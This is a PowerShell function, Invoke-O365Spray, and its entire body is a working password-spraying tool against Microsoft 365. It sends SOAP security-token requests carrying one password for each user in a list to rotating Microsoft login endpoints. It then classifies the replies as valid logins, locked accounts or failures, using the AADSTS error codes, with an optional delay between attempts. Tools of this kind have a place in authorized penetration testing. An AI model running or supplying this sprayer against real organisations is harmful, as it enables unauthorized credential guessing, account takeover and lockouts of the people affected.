Function Invoke-O365Spray{
    [CmdletBinding()]
    Param(
        [parameter(Mandatory= $false, HelpMessage= "file with users")]
        [ValidateScript({
                        if( -Not ($_ | Test-Path) ){
                            throw ("The file does not exist in {0}" -f (Split-Path -Path $_))
                        }
                        if(-Not ($_ | Test-Path -PathType Leaf) ){
                            throw "The users argument must be a file. Folder paths are not allowed."
                        }
                        return $true
        })]
        [System.IO.FileInfo]$users,

        [parameter(ValueFromPipeline = $True,ValueFromPipeLineByPropertyName = $True, HelpMessage= "single user")]
        [string]$user,

        [parameter(Mandatory= $false, ValueFromPipeline = $True,ValueFromPipeLineByPropertyName = $True, HelpMessage= "file with users")]
        [string]$password,

        [Parameter(HelpMessage="Pause between sprays in milliseconds")]
        [int32]$Sleep = 0
    )
    Begin{
        <#
        Potentially domains
        nexus.microsoftonline-p.com
        #>
        $all_users_test = @()
        $ms_hosts = @(
            'https://login.windows.net'
            'https://login.microsoftonline.com'
            'https://nexus.microsoftonline-p.com'
            'https://login.microsoftonline-p.com'
            'https://loginex.microsoftonline.com'
        )
        $endpoints = @(
            'rst2.srf'
            'rst3.srf'
        )
        [xml]$post_xml = '<?xml version="1.0" encoding="UTF-8"?><S:Envelope xmlns:S="http://www.w3.org/2003/05/soap-envelope" xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd" xmlns:wsp="http://schemas.xmlsoap.org/ws/2004/09/policy" xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:wst="http://schemas.xmlsoap.org/ws/2005/02/trust"><S:Header><wsa:Action S:mustUnderstand="1">http://schemas.xmlsoap.org/ws/2005/02/trust/RST/Issue</wsa:Action><wsa:To S:mustUnderstand="1">https://login.microsoftonline.com/rst2.srf</wsa:To><ps:AuthInfo xmlns:ps="http://schemas.microsoft.com/LiveID/SoapServices/v1" Id="PPAuthInfo"><ps:BinaryVersion>5</ps:BinaryVersion><ps:HostingApp>Managed IDCRL</ps:HostingApp></ps:AuthInfo><wsse:Security><wsse:UsernameToken wsu:Id="user"><wsse:Username>{0}</wsse:Username><wsse:Password>{1}</wsse:Password></wsse:UsernameToken><wsu:Timestamp Id="Timestamp"><wsu:Created>{3}</wsu:Created><wsu:Expires>{4}</wsu:Expires></wsu:Timestamp></wsse:Security></S:Header><S:Body><wst:RequestSecurityToken xmlns:wst="http://schemas.xmlsoap.org/ws/2005/02/trust" Id="RST0"><wst:RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</wst:RequestType><wsp:AppliesTo><wsa:EndpointReference><wsa:Address>sharepoint.com</wsa:Address></wsa:EndpointReference></wsp:AppliesTo><wsp:PolicyReference URI="MBI"/></wst:RequestSecurityToken></S:Body></S:Envelope>'
        #[xml]$post_xml = '<?xml version="1.0" encoding="UTF-8"?><S:Envelope xmlns:S="http://www.w3.org/2003/05/soap-envelope" xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd" xmlns:wsp="http://schemas.xmlsoap.org/ws/2004/09/policy" xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:wst="http://schemas.xmlsoap.org/ws/2005/02/trust"><S:Header><wsa:Action S:mustUnderstand="1">http://schemas.xmlsoap.org/ws/2005/02/trust/RST/Issue</wsa:Action><wsa:To S:mustUnderstand="1">online.lync.com</wsa:To><ps:AuthInfo xmlns:ps="http://schemas.microsoft.com/LiveID/SoapServices/v1" Id="PPAuthInfo"><ps:BinaryVersion>5</ps:BinaryVersion><ps:HostingApp>Managed IDCRL</ps:HostingApp></ps:AuthInfo><wsse:Security><wsse:UsernameToken wsu:Id="user"><wsse:Username>{0}</wsse:Username><wsse:Password>{1}</wsse:Password></wsse:UsernameToken></wsse:Security></S:Header><S:Body><wst:RequestSecurityToken xmlns:wst="http://schemas.xmlsoap.org/ws/2005/02/trust" Id="RST0"><wst:RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</wst:RequestType><wsp:AppliesTo><wsa:EndpointReference><wsa:Address>sharepoint.com</wsa:Address></wsa:EndpointReference></wsp:AppliesTo><wsp:PolicyReference URI="MBI"/></wst:RequestSecurityToken></S:Body></S:Envelope>'
        #[xml]$post_xml = '<?xml version="1.0" encoding="UTF-8"?><S:Envelope xmlns:S="http://www.w3.org/2003/05/soap-envelope" xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd" xmlns:wsp="http://schemas.xmlsoap.org/ws/2004/09/policy" xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:wst="http://schemas.xmlsoap.org/ws/2005/02/trust"><S:Header><wsa:Action S:mustUnderstand="1">http://schemas.xmlsoap.org/ws/2005/02/trust/RST/Issue</wsa:Action><wsa:To S:mustUnderstand="1">https://login.microsoftonline.com/rst2.srf</wsa:To><ps:AuthInfo xmlns:ps="http://schemas.microsoft.com/LiveID/SoapServices/v1" Id="PPAuthInfo"><ps:BinaryVersion>5</ps:BinaryVersion><ps:HostingApp>Managed IDCRL</ps:HostingApp></ps:AuthInfo><wsse:Security><wsse:UsernameToken wsu:Id="user"><wsse:Username>{0}</wsse:Username><wsse:Password>{1}</wsse:Password></wsse:UsernameToken></wsse:Security></S:Header><S:Body><wst:RequestSecurityToken xmlns:wst="http://schemas.xmlsoap.org/ws/2005/02/trust" Id="RST0"><wst:RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</wst:RequestType><wsp:AppliesTo><wsa:EndpointReference><wsa:Address>online.lync.com</wsa:Address></wsa:EndpointReference></wsp:AppliesTo><wsp:PolicyReference URI="MBI"/></wst:RequestSecurityToken></S:Body></S:Envelope>'
        #Start Time
        $starttimer = Get-Date
        #####Get Default parameters ########
        $MyParams = $PSBoundParameters
        #Check verbose options
        if($MyParams.ContainsKey('Verbose') -and $MyParams.Verbose){
            $VerboseOptions=@{Verbose=$true}
        }
        else{
            $VerboseOptions=@{Verbose=$false}
        }
        #Check Debug options
        if($MyParams.ContainsKey('Debug') -and $MyParams.Debug){
            $VerboseOptions.Add("Debug",$true)
        }
        else{
            $VerboseOptions.Add("Debug",$false)
        }
        #Check informationAction
        if($MyParams.ContainsKey('InformationAction') -and $MyParams.InformationAction){
            $VerboseOptions.Add("InformationAction",$MyParams.InformationAction)
        }
        else{
            $VerboseOptions.Add("InformationAction","SilentlyContinue")
        }
        if(!$MyParams.ContainsKey('password')){
            $secure_string = Read-Host -assecurestring "Please enter password"
            $password = [Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($secure_string))
        }
        #Set script path var
        $ScriptPath = $PSScriptRoot #Split-Path $MyInvocation.MyCommand.Path -Parent
        Set-Variable -Name ScriptPath -Value $ScriptPath -Scope Script
        if($PSBoundParameters.ContainsKey('users')){
            $all_users = Get-Content $users
        }
        elseif($PSBoundParameters.ContainsKey('user')){
            $all_users = @($user)
        }
        else{
            $all_users = $null
        }
        #Add namespace
        $namespace_manager = New-Object System.Xml.XmlNamespaceManager($post_xml.NameTable)
        $namespaceUri = $post_xml.DocumentElement.NamespaceURI
        $namespace_manager.AddNamespace("wsse", $namespaceUri)
        $namespace_manager.AddNamespace("S", $namespaceUri)
        $namespace_manager.AddNamespace("wsa", $namespaceUri)
        $namespace_manager.AddNamespace("wsp", $namespaceUri)
        $namespace_manager.AddNamespace("wsu", $namespaceUri)
        $namespace_manager.AddNamespace("wst", $namespaceUri)
        $namespace_manager.AddNamespace("ps", $namespaceUri)
        #Get user node
        $user_node = $post_xml.SelectSingleNode("//S:Envelope/S:Header", $namespace_manager)
    }
    Process{
        if($null -ne $all_users -and $password.Length -gt 0){
            foreach($test_user in $all_users){
                $test_result = @{
                    username = $test_user
                    status = $null
                }
                #Get random endpoint
                $index = Get-Random -Minimum 0 -Maximum 4
                $endpoint = ('{0}/rst2.srf' -f $ms_hosts.GetValue($index))
                #Prepare post data
                $user_node.Security.UsernameToken.Username = $test_user.ToString()
                $user_node.Security.UsernameToken.Password = $password
                #Add timestamp
                $user_node.Security.Timestamp.Created = [DateTime]::UtcNow.ToString("o")
                $user_node.Security.Timestamp.Expires = [DateTime]::UtcNow.AddDays(1).ToString("o")
                #Add domain
                $user_node.To.InnerText = "online.yammer.com"
                $param = @{
                    Url = $endpoint;
                    Method = "Post";
                    Content_Type = 'application/soap+xml; charset=utf-8';
                    Data= $post_xml.OuterXml;
                    InformationAction = $VerboseOptions.InformationAction;
                    Verbose = $VerboseOptions.Verbose;
                    Debug = $VerboseOptions.Debug;
                }
                [xml]$response = New-WebRequest @param
                try{
                    #Get body
                    $body = $response.SelectSingleNode("//S:Envelope/S:Body", $namespace_manager)
                    if($null -ne $body.psobject.Properties.Item('RequestSecurityTokenResponse')){
                        Write-Information ("Potentially valid login detected for {0}" -f $test_user) -InformationAction $VerboseOptions.InformationAction
                        $test_result.status = ("Potentially valid login detected for {0}" -f $test_user)
                    }
                    elseif($body.Fault.Detail.error.internalerror.text.Contains('AADSTS50053')){
                        Write-Verbose ("Account {0} is locked" -f $test_user)
                        $error_message = Get-RSTFaultDetails -raw_message $response
                        Write-Verbose $error_message
                        $test_result.status = $error_message
                    }
                    elseif($body.Fault.Detail.error.internalerror.text.Contains('AADSTS53003')){
                        Write-Information ("Potentially valid login detected for {0}" -f $test_user) -InformationAction $VerboseOptions.InformationAction
                        $error_message = Get-RSTFaultDetails -raw_message $response
                        Write-Verbose $error_message
                        $test_result.status = ("Potentially valid login detected for {0}" -f $test_user)
                    }
                    elseif($null -ne $body.psobject.Properties.Item('Fault')){
                        Write-Verbose ("Failed Authentication for {0}" -f $test_user)
                        $error_message = Get-RSTFaultDetails -raw_message $response
                        Write-Verbose $error_message
                        $test_result.status = $error_message
                    }
                }
                catch{
                    Write-Verbose $_.Exception.Message
                    $test_result.status = $null
                }
                #Check if pause between execution
                if($PSBoundParameters.ContainsKey('Sleep') -and $PSBoundParameters.Sleep -ge 0){
                    Write-Verbose ($script:messages.SleepMessage -f $Sleep)
                    Start-Sleep -Milliseconds $Sleep
                }
                $user_object = New-Object PSObject -Property $test_result
                $all_users_test+=$user_object
            }
        }
    }
    End{
        $all_users_test
    }
}